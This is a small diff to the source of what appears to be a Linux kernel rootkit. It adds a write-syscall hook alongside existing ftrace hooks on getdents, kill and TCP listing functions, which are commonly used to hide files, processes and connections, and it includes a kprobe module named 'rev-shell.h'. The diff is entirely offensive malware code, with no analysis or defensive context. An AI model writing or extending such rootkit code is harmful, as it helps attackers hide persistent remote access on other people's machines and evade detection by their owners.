@@ -19,6 +19,7 @@
 #include "hooks/getdents64.h"
 #include "hooks/kill.h"
 #include "hooks/tcp.h"
+#include "hooks/write.h"
 
 // Kprobes
 #include "kprobe/rev-shell.h"
@@ -30,6 +31,7 @@ static struct ftrace_hook hooks[] = {
   HOOK("__x64_sys_getdents", hooked_getdents, &og_getdents),
   HOOK("__x64_sys_getdents64", hooked_getdents64, &og_getdents64),
   HOOK("__x64_sys_kill", hooked_kill, &og_kill),
+  HOOK("__x64_sys_write", hooked_write, &og_write),
   HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &og_tcp4_seq_show),
   HOOK("tcp6_seq_show", hooked_tcp6_seq_show, &og_tcp6_seq_show),
 };
